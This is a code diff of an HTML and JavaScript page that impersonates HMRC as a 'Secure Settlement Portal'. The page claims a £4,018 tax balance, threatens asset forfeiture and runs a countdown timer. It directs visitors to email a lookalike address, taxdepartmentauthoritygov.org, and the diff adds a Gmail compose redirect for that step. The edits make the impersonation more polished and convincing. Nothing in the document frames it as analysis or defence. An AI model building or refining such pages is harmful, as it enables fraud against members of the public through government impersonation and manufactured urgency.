@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HMRC | Secure Settlement</title>
+    <title>HMRC | Secure Settlement Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -16,7 +16,7 @@
 
         body {
             background-color: var(--bg);
-            background-image: radial-gradient(circle at 50% 50%, rgba(0, 255, 135, 0.03) 0%, transparent 50%);
+            background-image: radial-gradient(circle at 50% 50%, rgba(0, 255, 135, 0.04) 0%, transparent 60%);
             color: white;
             font-family: 'Plus Jakarta Sans', sans-serif;
             margin: 0;
@@ -24,138 +24,185 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            overflow: hidden;
         }
 
-        .container { width: 100%; max-width: 440px; }
+        .container { width: 100%; max-width: 440px; position: relative; z-index: 1; }
 
         .card {
             background: var(--glass);
             backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
             border: 1px solid var(--glass-border);
             border-radius: 40px;
             padding: 48px;
             text-align: center;
-            box-shadow: 0 50px 100px -20px rgba(0,0,0,0.5);
+            box-shadow: 0 50px 100px -20px rgba(0,0,0,0.6);
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .hidden { display: none; }
+        .hidden { display: none; opacity: 0; transform: scale(0.95); }
+        .visible { display: block; opacity: 1; transform: scale(1); }
 
         .gov-uk-logo {
-            font-weight: 800; font-size: 14px; letter-spacing: 2px;
+            font-weight: 800; font-size: 13px; letter-spacing: 2px;
             text-transform: uppercase; margin-bottom: 30px;
             display: flex; align-items: center; justify-content: center; gap: 10px;
+            color: #eee;
         }
         .gov-uk-logo::before { content: ""; width: 10px; height: 10px; background: var(--primary); border-radius: 2px; }
 
+        .amount-container { margin: 35px 0; }
+        .amount-label { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 2px; }
         .amount-value {
-            font-size: 52px; font-weight: 800; letter-spacing: -2px;
-            background: linear-gradient(to bottom, #fff, #888);
+            font-size: 56px; font-weight: 800; letter-spacing: -2px;
+            background: linear-gradient(to bottom, #fff, #999);
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            margin: 10px 0;
+        }
+
+        .instruction-box {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 25px 0;
+            text-align: left;
+        }
+
+        .email-label { font-size: 10px; color: #666; letter-spacing: 1px; margin-bottom: 5px; }
+        .email-value { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 15px; display: block; }
+        .keyword-highlight { 
+            font-family: 'JetBrains Mono'; 
+            color: var(--primary); 
+            font-size: 24px; 
+            font-weight: 800;
+            display: block;
         }
 
         .main-action {
             width: 100%; background: white; color: black; border: none;
-            padding: 20px; border-radius: 18px; font-weight: 700;
-            cursor: pointer; transition: 0.3s; margin-top: 20px;
-            text-transform: uppercase;
+            padding: 20px; border-radius: 18px; font-weight: 800;
+            font-size: 15px; cursor: pointer; transition: 0.3s;
+            text-transform: uppercase; letter-spacing: 0.5px;
         }
-        .main-action:hover { background: var(--primary); transform: scale(1.02); }
+        .main-action:hover { background: var(--primary); transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 255, 135, 0.2); }
 
-        .email-box {
-            background: rgba(255,255,255,0.05);
-            padding: 25px; border-radius: 20px;
-            margin: 25px 0; border: 1px solid var(--glass-border);
-            text-align: left;
-        }
-
-        .instruction-highlight { 
-            color: var(--primary); 
-            font-family: 'JetBrains Mono'; 
-            font-weight: 800; 
-            font-size: 22px;
-            display: block;
-            margin-top: 5px;
-        }
-        
         .timer-box {
-            margin-top: 30px; font-family: 'JetBrains Mono'; font-size: 12px;
-            color: var(--accent); font-weight: 600;
+            margin-top: 35px; font-family: 'JetBrains Mono'; font-size: 11px;
+            color: var(--accent); font-weight: 600; letter-spacing: 0.5px;
+        }
+        #timer { font-size: 22px; display: block; margin-top: 5px; }
+
+        /* Subtle background animation */
+        .bg-glow {
+            position: absolute; width: 400px; height: 400px;
+            background: var(--primary); filter: blur(150px);
+            border-radius: 50%; opacity: 0.05; z-index: 0;
+            top: 50%; left: 50%; transform: translate(-50%, -50%);
         }
     </style>
 </head>
 <body>
 
+<div class="bg-glow"></div>
+
 <div class="container">
-    <!-- PAGE 1: OVERVIEW -->
-    <div id="page1" class="card">
-        <div class="gov-uk-logo">GOV.UK Compliance</div>
-        <div style="font-size: 11px; color: #666; font-family: 'JetBrains Mono';">REF: GB-TAX-99281-Z</div>
+    <!-- STAGE 1: SETTLEMENT OVERVIEW -->
+    <div id="page1" class="card visible">
+        <div class="gov-uk-logo">HMRC Compliance</div>
+        <div style="font-size: 10px; color: #555; font-family: 'JetBrains Mono';">CASE ID: GB-TAX-99281-Z</div>
         
-        <div style="margin: 40px 0;">
-            <span style="font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 2px;">Settlement Amount</span>
+        <div class="amount-container">
+            <span class="amount-label">Outstanding Balance</span>
             <div class="amount-value">£4,018.00</div>
         </div>
 
-        <p style="font-size: 14px; color: #aaa; line-height: 1.6;">A formal settlement is required to prevent immediate asset forfeiture. Request the secure gateway below.</p>
+        <p style="font-size: 14px; color: #aaa; line-height: 1.6; padding: 0 10px;">
+            A mandatory tax settlement is required to prevent immediate asset forfeiture and statutory penalties.
+        </p>
         
         <button class="main-action" onclick="showPage2()">Request Settlement Details</button>
     </div>
 
-    <!-- PAGE 2: INSTRUCTIONS -->
+    <!-- STAGE 2: GMAIL REDIRECTION & INSTRUCTIONS -->
     <div id="page2" class="card hidden">
-        <div class="gov-uk-logo">Final Step</div>
+        <div class="gov-uk-logo">Action Required</div>
         
-        <p style="font-size: 15px; color: #eee; margin-bottom: 20px;">To receive the secure link, you must send an email to our automated support system.</p>
+        <p style="font-size: 14px; color: #ccc; margin-bottom: 20px;">
+            To receive the secure payment gateway link, send an email to our automated system:
+        </p>
         
-        <div class="email-box">
-            <div style="font-size: 11px; color: #888; letter-spacing: 1px;">SEND TO:</div>
-            <div style="font-weight: 600; font-size: 14px; margin-bottom: 20px; color: white;">support@taxdepartmentauthoritygov.org</div>
+        <div class="instruction-box">
+            <span class="email-label">RECIPIENT:</span>
+            <span class="email-value">support@taxdepartmentauthoritygov.org</span>
             
-            <div style="font-size: 11px; color: #888; letter-spacing: 1px;">MESSAGE CONTENT:</div>
-            <span class="instruction-highlight">Details</span>
+            <span class="email-label">MESSAGE BODY:</span>
+            <span class="keyword-highlight">Details</span>
         </div>
 
         <button class="main-action" onclick="sendEmail()">Click to Send Email</button>
 
         <div class="timer-box">
-            SETTLEMENT DEADLINE: MONDAY 8TH<br>
-            <span id="timer" style="font-size: 20px;">--:--:--:--</span>
+            SETTLEMENT DEADLINE: MONDAY 8TH
+            <span id="timer">--:--:--:--</span>
         </div>
     </div>
 </div>
 
 <script>
+    const TARGET_EMAIL = "support@taxdepartmentauthoritygov.org";
+    const KEYWORD = "Details";
+
     function showPage2() {
-        document.getElementById('page1').classList.add('hidden');
-        document.getElementById('page2').classList.remove('hidden');
+        // Fade out page 1
+        const p1 = document.getElementById('page1');
+        const p2 = document.getElementById('page2');
+        
+        p1.style.opacity = '0';
+        p1.style.transform = 'scale(0.9) translateY(-20px)';
+        
+        setTimeout(() => {
+            p1.style.display = 'none';
+            p2.style.display = 'block';
+            // Trigger browser reflow
+            p2.offsetHeight; 
+            p2.classList.remove('hidden');
+            p2.classList.add('visible');
+        }, 500);
     }
 
     function sendEmail() {
-        const email = "support@taxdepartmentauthoritygov.org";
-        const subject = "Details";
-        const body = "Details";
-        window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+        // Gmail Direct Compose URL
+        const gmailUrl = `https://mail.google.com/mail/?view=cm&fs=1&to=${TARGET_EMAIL}&su=${encodeURIComponent(KEYWORD)}&body=${encodeURIComponent(KEYWORD)}`;
+        
+        // Open Gmail in new tab
+        const win = window.open(gmailUrl, '_blank');
+        
+        // Fallback: If popup blocked or not using Gmail web, trigger system mailto
+        if (!win || win.closed || typeof win.closed == 'undefined') {
+            window.location.href = `mailto:${TARGET_EMAIL}?subject=${KEYWORD}&body=${KEYWORD}`;
+        }
     }
 
+    // Countdown to Monday July 8th, 2024
     function updateTimer() {
-        // Targets Monday July 8th, 2024
-        const target = new Date("July 8, 2024 23:59:59").getTime();
+        const targetDate = new Date("July 8, 2024 23:59:59").getTime();
         const now = new Date().getTime();
-        const diff = target - now;
+        const distance = targetDate - now;
 
-        if (diff <= 0) {
+        if (distance < 0) {
             document.getElementById('timer').innerText = "EXPIRED";
+            document.getElementById('timer').style.color = "gray";
             return;
         }
 
-        const d = Math.floor(diff / (1000 * 60 * 60 * 24));
-        const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-        const s = Math.floor((diff % (1000 * 60)) / 1000);
+        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
 
         document.getElementById('timer').innerText = 
-            `${d}d ${h.toString().padStart(2, '0')}h ${m.toString().padStart(2, '0')}m ${s.toString().padStart(2, '0')}s`;
+            `${days}d ${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
     }
 
     setInterval(updateTimer, 1000);
